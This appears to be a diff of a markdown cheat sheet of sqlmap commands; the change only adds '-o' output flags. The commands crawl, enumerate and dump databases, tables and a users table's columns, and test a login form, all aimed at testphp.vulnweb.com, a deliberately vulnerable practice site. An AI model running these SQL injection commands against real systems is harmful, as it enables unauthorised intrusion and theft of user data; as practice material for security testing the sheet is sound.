@@ -6,23 +6,23 @@
 
 # auto crawling command
 
-    sqlmap -u "http://testphp.vulnweb.com/" --crawl 3 --batch --threads 5 --random-agent --risk 1 --level 1
+    sqlmap -u "http://testphp.vulnweb.com/" --crawl 3 --batch --threads 5 --random-agent --risk 1 --level 1 -o sqlcrawl.txt
 
-    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dump-all --batch --threads 7
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dump-all --batch --threads 7 -o sqldumldataauto.txt
 
 # Step by step dumping databases
 
-    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch --threads 5
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch --threads 5 -o sqldumpfulldatabase.txt
 
-    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch --threads 5
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch --threads 5 -o sqldumpfulltable.txt
 
-    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch --threads 5
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch --threads 5 -o sqlreadallcolumnsdata.txt
 
-    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump --batch --threads 5
+    sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump --batch --threads 5 -o sqldumpfullcolumns.txt
 
 ## Login page brute-forcing
 
-    sqlmap -u "http://testphp.vulnweb.com/login.php" --forms
+    sqlmap -u "http://testphp.vulnweb.com/login.php" --forms -o sqlbruteForcelogin.txt
 
     sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=abd&pass=abc&login=submit" --dbs
 
